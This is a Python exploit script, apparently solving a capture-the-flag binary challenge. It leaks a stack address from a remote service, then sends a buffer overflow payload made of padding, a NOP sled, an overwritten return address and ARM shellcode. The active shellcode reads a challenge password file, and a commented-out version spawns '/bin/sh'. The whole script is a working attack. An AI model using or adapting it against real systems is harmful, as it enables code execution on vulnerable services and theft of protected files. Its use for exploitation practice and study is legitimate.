#!/usr/bin/env python3

import pwn
import socket
import time
import struct
from telnetlib import Telnet

HOST = ''  # The server's hostname or IP address
PORT = 61045        # The port used by the server

#shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'

shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'

pad = '\x47'*164
nop = '\x90'*100


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    #s.sendall(b'Hello, world')
    data = s.recv(1024)
    print(data)
    s.sendall(b'AAAAAAAAAAAA\n')
    #time.sleep(1)
    mem = s.recv(1024)
    mem = str(mem)[2:11]
    print("memoire: ",mem)
    eip = struct.pack('I',int(mem, 16)+100)
    eip = str(eip)[2:].replace("'", "")
    print(eip)
    payload = pad + nop + eip + shellcode
    s.sendall(b'y')
    mem = s.recv(1024)
    s.sendall(payload.encode())
    s.sendall(b'\n')
    #s.sendall(payload.encode())
    #time.sleep(2)
    print(s.recv(1024))
    print(s.recv(1024))
    print(s.recv(1024))
    print(s.recv(1024))
    s.sendall(b'a')

#    print(s.recv(1024))
#    t = Telnet()
#    t.sock = s
#    t.interact()
#print('Received', repr(data))
